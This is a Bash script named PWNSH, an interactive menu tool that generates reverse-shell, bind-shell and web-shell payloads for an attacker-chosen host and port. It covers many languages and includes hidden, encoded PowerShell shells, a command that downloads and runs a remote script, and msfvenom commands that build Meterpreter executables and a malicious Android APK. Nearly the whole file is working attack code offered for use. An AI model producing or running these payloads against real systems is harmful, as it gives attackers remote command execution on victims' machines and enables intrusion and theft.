#!/bin/bash

# PWNSH - Reverse Shell Payload Generator
# Made by 0xd0lv3
# Instagram: @d0lv3 | LinkedIn: www.linkedin.com/in/d0lv3/

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'
HIGHLIGHT='\033[7m'

# Global variables
LHOST=""
LPORT=""
SELECTED=1
MENU_SIZE=15

# Enable mouse support
enable_mouse() {
    echo -ne '\033[?1000h\033[?1002h\033[?1015h\033[?1006h'
}

# Disable mouse support
disable_mouse() {
    echo -ne '\033[?1000l\033[?1002l\033[?1015l\033[?1006l'
}

# Cleanup on exit
cleanup() {
    disable_mouse
    tput cnorm
    stty echo
}

trap cleanup EXIT

# Banner function
show_banner() {
    echo -e "${CYAN}"
    if command -v figlet &> /dev/null; then
        figlet -f slant "  PWNSH"
    else
        cat << 'EOF'
         ____ _       ___   _______ __  __
        / __ \ |     / / | / / ___// / / /
       / /_/ / | /| / /  |/ /\__ \/ /_/ / 
      / ____/| |/ |/ / /|  /___/ / __  /  
     /_/     |__/|__/_/ |_//____/_/ /_/ 

EOF
    fi
    echo -e "${NC}"
    echo -e "${PURPLE}============================================================${NC}"
    echo -e "${WHITE}  Reverse Shell Payload Generator${NC}"
    echo -e "${GREEN}  Made by: ${YELLOW}0xd0lv3${NC}"
    echo -e "${CYAN}  Instagram: ${WHITE}@d0lv3 ${CYAN}| LinkedIn: ${WHITE}www.linkedin.com/in/d0lv3/${NC}"
    echo -e "${PURPLE}============================================================${NC}"
    echo
    if [ -n "$LHOST" ] && [ -n "$LPORT" ]; then
        echo -e "${YELLOW}Target: ${WHITE}${LHOST}:${LPORT}${NC}"
        echo
    fi
}

# Display payload
show_payload() {
    local name=$1
    local payload=$2
    local listener=$3
    
    echo -e "${GREEN}[${name}]${NC}"
    echo -e "${CYAN}Payload:${NC}"
    echo -e "${WHITE}${payload}${NC}"
    echo
    echo -e "${CYAN}Listener:${NC}"
    echo -e "${WHITE}${listener}${NC}"
    echo
}

# Bash Payloads
bash_payloads() {
    clear
    show_banner
    echo -e "${PURPLE}============ BASH PAYLOADS ============${NC}"
    echo

    show_payload "Bash -i" \
        "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1" \
        "nc -lvnp ${LPORT}"

    show_payload "Bash 196" \
        "0<&196;exec 196<>/dev/tcp/${LHOST}/${LPORT}; bash <&196 >&196 2>&196" \
        "nc -lvnp ${LPORT}"

    show_payload "Bash read line" \
        "exec 5<>/dev/tcp/${LHOST}/${LPORT};cat <&5 | while read line; do \$line 2>&5 >&5; done" \
        "nc -lvnp ${LPORT}"

    show_payload "Bash 5" \
        "bash -i 5<> /dev/tcp/${LHOST}/${LPORT} 0<&5 1>&5 2>&5" \
        "nc -lvnp ${LPORT}"

    show_payload "Bash UDP" \
        "bash -i >& /dev/udp/${LHOST}/${LPORT} 0>&1" \
        "nc -u -lvnp ${LPORT}"

    echo -n "Press Enter to return..."
    read -r
}

# Netcat Payloads
netcat_payloads() {
    clear
    show_banner
    echo -e "${PURPLE}============ NETCAT PAYLOADS ============${NC}"
    echo

    show_payload "nc mkfifo" \
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f" \
        "nc -lvnp ${LPORT}"

    show_payload "nc -e" \
        "nc ${LHOST} ${LPORT} -e /bin/bash" \
        "nc -lvnp ${LPORT}"

    show_payload "nc.exe -e" \
        "nc.exe ${LHOST} ${LPORT} -e cmd.exe" \
        "nc -lvnp ${LPORT}"

    show_payload "BusyBox nc -e" \
        "busybox nc ${LHOST} ${LPORT} -e /bin/bash" \
        "nc -lvnp ${LPORT}"

    show_payload "nc -c" \
        "nc -c bash ${LHOST} ${LPORT}" \
        "nc -lvnp ${LPORT}"

    show_payload "ncat -e" \
        "ncat ${LHOST} ${LPORT} -e /bin/bash" \
        "nc -lvnp ${LPORT}"

    show_payload "ncat.exe -e" \
        "ncat.exe ${LHOST} ${LPORT} -e cmd.exe" \
        "nc -lvnp ${LPORT}"

    show_payload "ncat udp" \
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|ncat -u ${LHOST} ${LPORT} >/tmp/f" \
        "nc -u -lvnp ${LPORT}"

    show_payload "rustcat" \
        "rcat connect -s bash ${LHOST} ${LPORT}" \
        "rcat listen ${LPORT}"

    show_payload "curl" \
        "C='curl -Ns telnet://${LHOST}:${LPORT}'; \$C </dev/null 2>&1 | bash 2>&1 | \$C >/dev/null" \
        "nc -lvnp ${LPORT}"

    echo -n "Press Enter to return..."
    read -r
}

# Python Payloads
python_payloads() {
    clear
    show_banner
    echo -e "${PURPLE}============ PYTHON PAYLOADS ============${NC}"
    echo

    show_payload "Python3 #1" \
        "export RHOST=\"${LHOST}\";export RPORT=${LPORT};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'" \
        "nc -lvnp ${LPORT}"

    show_payload "Python3 #2" \
        "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'" \
        "nc -lvnp ${LPORT}"

    show_payload "Python3 shortest" \
        "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"${LHOST}\",${LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'" \
        "nc -lvnp ${LPORT}"

    show_payload "Python3 IPv6" \
        "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'" \
        "nc -lvnp ${LPORT} -6"

    show_payload "Python2" \
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" \
        "nc -lvnp ${LPORT}"

    echo -n "Press Enter to return..."
    read -r
}

# PHP Payloads
php_payloads() {
    clear
    show_banner
    echo -e "${PURPLE}============ PHP PAYLOADS ============${NC}"
    echo

    show_payload "PHP exec" \
        "php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});exec(\"/bin/bash <&3 >&3 2>&3\");'" \
        "nc -lvnp ${LPORT}"

    show_payload "PHP shell_exec" \
        "php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});shell_exec(\"/bin/bash <&3 >&3 2>&3\");'" \
        "nc -lvnp ${LPORT}"

    show_payload "PHP system" \
        "php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});system(\"/bin/bash <&3 >&3 2>&3\");'" \
        "nc -lvnp ${LPORT}"

    show_payload "PHP passthru" \
        "php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});passthru(\"/bin/bash <&3 >&3 2>&3\");'" \
        "nc -lvnp ${LPORT}"

    show_payload "PHP backticks" \
        "php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});\`/bin/bash <&3 >&3 2>&3\`;'" \
        "nc -lvnp ${LPORT}"

    show_payload "PHP popen" \
        "php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});popen(\"/bin/bash <&3 >&3 2>&3\", \"r\");'" \
        "nc -lvnp ${LPORT}"

    show_payload "PHP proc_open" \
        "php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT}\");\$proc=proc_open(\"/bin/bash\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'" \
        "nc -lvnp ${LPORT}"

    echo -n "Press Enter to return..."
    read -r
}

# PowerShell Payloads
powershell_payloads() {
    clear
    show_banner
    echo -e "${PURPLE}============ POWERSHELL PAYLOADS ============${NC}"
    echo

    show_payload "PowerShell #1" \
        "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"" \
        "nc -lvnp ${LPORT}"

    show_payload "PowerShell #2" \
        "powershell -nop -W hidden -noni -ep bypass -c \"\$TCPClient = New-Object Net.Sockets.TCPClient('${LHOST}', ${LPORT});\$NetworkStream = \$TCPClient.GetStream();\$StreamWriter = New-Object IO.StreamWriter(\$NetworkStream);function WriteToStream (\$String) {[byte[]]\$script:Buffer = 0..\$TCPClient.ReceiveBufferSize | % {0};\$StreamWriter.Write(\$String + 'SHELL> ');\$StreamWriter.Flush()}WriteToStream '';while((\$BytesRead = \$NetworkStream.Read(\$Buffer, 0, \$Buffer.Length)) -gt 0) {\$Command = ([text.encoding]::UTF8).GetString(\$Buffer, 0, \$BytesRead - 1);\$Output = try {Invoke-Expression \$Command 2>&1 | Out-String} catch {\$_ | Out-String}WriteToStream (\$Output)}\$StreamWriter.Close()\"" \
        "nc -lvnp ${LPORT}"

    show_payload "Windows ConPty" \
        "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ${LHOST} ${LPORT}" \
        "stty raw -echo; (stty size; cat) | nc -lvnp ${LPORT}"

    local ps_payload
    ps_payload="\$client = New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    local ps_base64
    ps_base64=$(echo -n "$ps_payload" | iconv -t UTF-16LE 2>/dev/null | base64 -w 0 2>/dev/null || echo "[unavailable]")
    
    show_payload "PowerShell Base64" \
        "powershell -nop -NonI -W Hidden -Exec Bypass -enc ${ps_base64}" \
        "nc -lvnp ${LPORT}"

    echo -n "Press Enter to return..."
    read -r
}

# Perl/Ruby Payloads
perl_ruby_payloads() {
    clear
    show_banner
    echo -e "${PURPLE}============ PERL/RUBY PAYLOADS ============${NC}"
    echo

    show_payload "Perl" \
        "perl -e 'use Socket;\$i=\"${LHOST}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'" \
        "nc -lvnp ${LPORT}"

    show_payload "Perl no sh" \
        "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"${LHOST}:${LPORT}\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'" \
        "nc -lvnp ${LPORT}"

    show_payload "Ruby" \
        "ruby -rsocket -e'f=TCPSocket.open(\"${LHOST}\",${LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" \
        "nc -lvnp ${LPORT}"

    show_payload "Ruby no sh" \
        "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"${LHOST}\",\"${LPORT}\");loop{c.gets.chomp!;(exit! if \$_==\"exit\");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen(\$_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{\$_}\"}'" \
        "nc -lvnp ${LPORT}"

    show_payload "Ruby #2" \
        "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"${LHOST}\",${LPORT}))'" \
        "nc -lvnp ${LPORT}"

    echo -n "Press Enter to return..."
    read -r
}

# Web Shell Payloads
webshell_payloads() {
    clear
    show_banner
    echo -e "${PURPLE}============ WEB SHELL PAYLOADS ============${NC}"
    echo

    show_payload "Smallest Web Shell" \
        "<?=\`\$_GET[0]\`?>" \
        "Access: http://target.com/shell.php?0=whoami"

    show_payload "Small Web Shell" \
        "<?php system(\$_GET['cmd']);?>" \
        "Access: http://target.com/shell.php?cmd=whoami"

    show_payload "PHP cmd" \
        "<?php if(isset(\$_REQUEST[\"cmd\"])){ echo \"<pre>\"; \$cmd = (\$_REQUEST[\"cmd\"]); system(\$cmd); echo \"</pre>\"; die; }?>" \
        "Access: http://target.com/shell.php?cmd=whoami"

    show_payload "Web Shell To Interactive" \
        "bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'" \
        "URL encoded: bash+-c+'bash+-i+>%26+/dev/tcp/${LHOST}/${LPORT}+0>%261' || Listener: nc -lvnp ${LPORT}"

    echo -n "Press Enter to return..."
    read -r
}

# Java/Groovy Payloads
java_payloads() {
    clear
    show_banner
    echo -e "${PURPLE}============ JAVA/GROOVY PAYLOADS ============${NC}"
    echo

    show_payload "Java Runtime exec" \
        "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/${LHOST}/${LPORT};cat <&5 | while read line; do \\\$line 2>&5 >&5; done\"] as String[]); p.waitFor();" \
        "nc -lvnp ${LPORT}"

    show_payload "Groovy" \
        "String host=\"${LHOST}\";int port=${LPORT};String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();" \
        "nc -lvnp ${LPORT}"

    echo -n "Press Enter to return..."
    read -r
}

# Other Languages
other_languages() {
    clear
    show_banner
    echo -e "${PURPLE}============ OTHER LANGUAGES ============${NC}"
    echo

    show_payload "Node.js" \
        "(function(){var net = require(\"net\"),cp = require(\"child_process\"),sh = cp.spawn(\"/bin/bash\", []);var client = new net.Socket();client.connect(${LPORT}, \"${LHOST}\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();" \
        "nc -lvnp ${LPORT}"

    show_payload "Golang" \
        "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"${LHOST}:${LPORT}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" \
        "nc -lvnp ${LPORT}"

    show_payload "Lua" \
        "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('${LHOST}','${LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"" \
        "nc -lvnp ${LPORT}"

    show_payload "AWK" \
        "awk 'BEGIN {s = \"/inet/tcp/0/${LHOST}/${LPORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null" \
        "nc -lvnp ${LPORT}"

    show_payload "Dart" \
        "import 'dart:io';import 'dart:convert';main() {Socket.connect(\"${LHOST}\", ${LPORT}).then((socket) {socket.listen((data) {Process.start('/bin/bash', []).then((Process process) {process.stdin.writeln(new String.fromCharCodes(data).trim());process.stdout.transform(utf8.decoder).listen((output) { socket.write(output); });});}, onDone: () { socket.destroy(); });});}" \
        "nc -lvnp ${LPORT}"

    show_payload "Crystal" \
        "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"${LHOST}\",${LPORT});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'" \
        "nc -lvnp ${LPORT}"

    echo -n "Press Enter to return..."
    read -r
}

# Network Tools
network_tools() {
    clear
    show_banner
    echo -e "${PURPLE}============ NETWORK TOOLS ============${NC}"
    echo

    show_payload "Socat" \
        "socat TCP:${LHOST}:${LPORT} EXEC:/bin/bash" \
        "socat -d -d TCP-LISTEN:${LPORT} STDOUT"

    show_payload "Socat TTY" \
        "socat TCP:${LHOST}:${LPORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane" \
        "socat file:\`tty\`,raw,echo=0 TCP-LISTEN:${LPORT}"

    show_payload "Telnet" \
        "TF=\$(mktemp -u);mkfifo \$TF && telnet ${LHOST} ${LPORT} 0<\$TF | /bin/sh 1>\$TF" \
        "nc -lvnp ${LPORT}"

    show_payload "OpenSSL" \
        "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${LHOST}:${LPORT} > /tmp/s; rm /tmp/s" \
        "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -quiet -key key.pem -cert cert.pem -port ${LPORT}"

    show_payload "SQLite3 nc mkfifo" \
        "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f'" \
        "nc -lvnp ${LPORT}"

    show_payload "Zsh" \
        "zsh -c 'zmodload zsh/net/tcp && ztcp ${LHOST} ${LPORT} && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'" \
        "nc -lvnp ${LPORT}"

    echo -n "Press Enter to return..."
    read -r
}

# C/C# Payloads
c_csharp_payloads() {
    clear
    show_banner
    echo -e "${PURPLE}============ C/C# PAYLOADS ============${NC}"
    echo

    show_payload "C# TCP Client" \
        "using System;using System.Net.Sockets;using System.IO;using System.Diagnostics;namespace ConnectBack{public class Program{static StreamWriter streamWriter;public static void Main(string[] args){using(TcpClient client = new TcpClient(\"${LHOST}\", ${LPORT})){using(Stream stream = client.GetStream()){using(StreamReader rdr = new StreamReader(stream)){streamWriter = new StreamWriter(stream);Process p = new Process();p.StartInfo.FileName = \"cmd.exe\";p.StartInfo.CreateNoWindow = true;p.StartInfo.UseShellExecute = false;p.StartInfo.RedirectStandardOutput = true;p.StartInfo.RedirectStandardInput = true;p.StartInfo.RedirectStandardError = true;p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);p.Start();p.BeginOutputReadLine();while(true){p.StandardInput.WriteLine(rdr.ReadLine());}}}}}private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine){if (!String.IsNullOrEmpty(outLine.Data)){try{streamWriter.WriteLine(outLine.Data);streamWriter.Flush();}catch (Exception err) {}}}}}" \
        "nc -lvnp ${LPORT}"

    show_payload "C# Bash -i" \
        "using System;using System.Diagnostics;namespace BackConnect {class ReverseBash {public static void Main(string[] args) {Process proc = new System.Diagnostics.Process();proc.StartInfo.FileName = \"bash\";proc.StartInfo.Arguments = \"-c bash -i -p >& /dev/tcp/${LHOST}/${LPORT} 0>&1\";proc.StartInfo.UseShellExecute = false;proc.StartInfo.RedirectStandardOutput = true;proc.Start();while (!proc.StandardOutput.EndOfStream) {Console.WriteLine(proc.StandardOutput.ReadLine());}}}}" \
        "nc -lvnp ${LPORT}"

    echo -n "Press Enter to return..."
    read -r
}

# Bind Shells
bind_shells() {
    clear
    show_banner
    echo -e "${PURPLE}============ BIND SHELLS ============${NC}"
    echo

    show_payload "Python3 Bind" \
        "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",${LPORT}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'"\
        "nc ${LHOST} ${LPORT}"

    show_payload "PHP Bind" \
        "php -r '\$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind(\$s,\"0.0.0.0\",${LPORT});socket_listen(\$s,1);\$cl=socket_accept(\$s);while(1){if(!socket_write(\$cl,\"$ \",2))exit;\$in=socket_read(\$cl,100);\$cmd=popen(\"\$in\",\"r\");while(!feof(\$cmd)){\$m=fgetc(\$cmd);socket_write(\$cl,\$m,strlen(\$m));}}}'" \
        "nc ${LHOST} ${LPORT}"

    show_payload "nc Bind" \
        "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 ${LPORT} > /tmp/f" \
        "nc ${LHOST} ${LPORT}"

    show_payload "Perl Bind" \
        "perl -e 'use Socket;\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in(\$p, INADDR_ANY));listen(S,SOMAXCONN);for(;\$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'" \
        "nc ${LHOST} ${LPORT}"

    echo -n "Press Enter to return..."
    read -r
}

# MSFVenom Payloads
msfvenom_payloads() {
    clear
    show_banner
    echo -e "${PURPLE}============ MSFVENOM PAYLOADS ============${NC}"
    echo

    show_payload "Windows Meterpreter x64 Staged" \
        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe -o reverse.exe" \
        "msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost ${LHOST}; set lport ${LPORT}; exploit\""

    show_payload "Windows Shell x64 Stageless" \
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe -o reverse.exe" \
        "nc -lvnp ${LPORT}"

    show_payload "Linux x64 Meterpreter Staged" \
        "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o reverse.elf" \
        "msfconsole -q -x \"use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost ${LHOST}; set lport ${LPORT}; exploit\""

    show_payload "Linux x64 Shell Stageless" \
        "msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o reverse.elf" \
        "nc -lvnp ${LPORT}"

    show_payload "PHP Meterpreter" \
        "msfvenom -p php/meterpreter_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw -o shell.php" \
        "msfconsole -q -x \"use multi/handler; set payload php/meterpreter_reverse_tcp; set lhost ${LHOST}; set lport ${LPORT}; exploit\""

    show_payload "WAR Reverse TCP" \
        "msfvenom -p java/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f war -o shell.war" \
        "nc -lvnp ${LPORT}"

    show_payload "Android APK" \
        "msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=${LHOST} lport=${LPORT} R -o malicious.apk" \
        "msfconsole -q -x \"use multi/handler; set payload android/meterpreter/reverse_tcp; set lhost ${LHOST}; set lport ${LPORT}; exploit\""

    echo -n "Press Enter to return..."
    read -r
}

# Parse mouse input
parse_mouse() {
    local IFS=';'
    read -r -a MOUSE_EVENT
    local button=${MOUSE_EVENT[0]:3}
    local y=${MOUSE_EVENT[1]}
    
    if [[ $button == "0" ]]; then
        local menu_start=10
        local item=$((y - menu_start))
        
        if [[ $item -ge 1 && $item -le $MENU_SIZE ]]; then
            SELECTED=$item
            return 0
        fi
    fi
    return 1
}

# Read input with mouse and keyboard support
read_menu_input() {
    enable_mouse
    tput civis
    
    while true; do
        local input
        IFS= read -rsn1 input
        
        if [[ $input == $'\x1b' ]]; then
            read -rsn1 -t 0.01 input2
            if [[ $input2 == "[" ]]; then
                read -rsn1 input3
                case $input3 in
                    A)
                        ((SELECTED > 1)) && ((SELECTED--))
                        return 1
                        ;;
                    B)
                        ((SELECTED < MENU_SIZE)) && ((SELECTED++))
                        return 1
                        ;;
                    M)
                        if parse_mouse; then
                            return 0
                        fi
                        return 1
                        ;;
                    "<")
                        read -rsn10 -t 0.01 mouse_rest
                        return 1
                        ;;
                esac
            fi
        elif [[ $input == "" ]]; then
            return 0
        fi
    done
}

# Display menu item with highlighting
display_menu_item() {
    local num=$1
    local text=$2
    
    if [[ $num -eq $SELECTED ]]; then
        echo -e "${HIGHLIGHT}${YELLOW}  ${text}${NC}"
    else
        echo -e "  ${text}"
    fi
}

# Main menu with mouse support
show_menu() {
    while true; do
        clear
        show_banner
        echo -e "${PURPLE}============ PAYLOAD CATEGORIES ============${NC}"
        echo
        echo -e "${CYAN}Use arrow keys or mouse to navigate. Press Enter to select.${NC}"
        echo
        
        display_menu_item 1 "Bash Payloads"
        display_menu_item 2 "Netcat Payloads"
        display_menu_item 3 "Python Payloads"
        display_menu_item 4 "PHP Payloads"
        display_menu_item 5 "PowerShell Payloads"
        display_menu_item 6 "Perl/Ruby Payloads"
        display_menu_item 7 "Web Shells"
        display_menu_item 8 "Java/Groovy Payloads"
        display_menu_item 9 "Other Languages (Node, Go, Lua, AWK, etc.)"
        display_menu_item 10 "Network Tools (Socat, Telnet, OpenSSL, etc.)"
        display_menu_item 11 "C/C# Payloads"
        display_menu_item 12 "Bind Shells"
        display_menu_item 13 "MSFVenom Payloads"
        display_menu_item 14 "Change Target (Current: ${WHITE}${LHOST}:${LPORT}${NC})"
        echo
        display_menu_item 15 "Exit"
        
        if read_menu_input; then
            break
        fi
    done
    
    disable_mouse
    tput cnorm
}

# Main function
main() {
    if [ $# -eq 2 ]; then
        LHOST=$1
        LPORT=$2
    else
        show_banner
        echo -n "Enter LHOST: "
        read -r LHOST
        echo -n "Enter LPORT: "
        read -r LPORT
    fi
    
    while true; do
        show_menu
        choice=$SELECTED
        
        case $choice in
            1) bash_payloads ;;
            2) netcat_payloads ;;
            3) python_payloads ;;
            4) php_payloads ;;
            5) powershell_payloads ;;
            6) perl_ruby_payloads ;;
            7) webshell_payloads ;;
            8) java_payloads ;;
            9) other_languages ;;
            10) network_tools ;;
            11) c_csharp_payloads ;;
            12) bind_shells ;;
            13) msfvenom_payloads ;;
            14)
                clear
                show_banner
                echo -n "Enter LHOST: "
                read -r LHOST
                echo -n "Enter LPORT: "
                read -r LPORT
                ;;
            15)
                echo -e "${GREEN}[+] Exiting...${NC}"
                exit 0
                ;;
        esac
    done
}

main "$@"
